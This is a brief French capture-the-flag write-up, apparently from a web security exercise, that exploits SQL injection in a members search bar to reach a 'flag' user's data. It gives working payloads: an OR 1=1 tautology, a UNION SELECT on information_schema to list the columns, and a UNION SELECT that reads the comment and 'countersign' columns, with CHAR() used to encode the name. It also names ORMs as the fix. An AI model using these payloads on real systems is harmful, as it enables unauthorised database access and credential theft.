Menu déroulant/Members

## Comment ?
On a une barre de recherche avec le contenu qui est directement injecté dns une requête sql.

1ere étape:

1 OR 1=1 
On récupère tous les users et on se rend compte qu'un user s'appelle flag.

Ensuite on récupère toutes les colonnes de la base de donnée avec: 

1 UNION select table_name, column_name FROM information_schema.columns

Pour finir, dans la table user en testant toutes les colonnes, on trouve les colonnes intéressantes "Commentaire" et "countersign".  
1 UNION SELECT Commentaire, countersign FROM users WHERE first_name = CHAR(70,108,97,103) --  
CHAR(70,108,97,103) = "Flag"

## Comment l'éviter ?

Les ORM bloquent ce genre d'injections. 
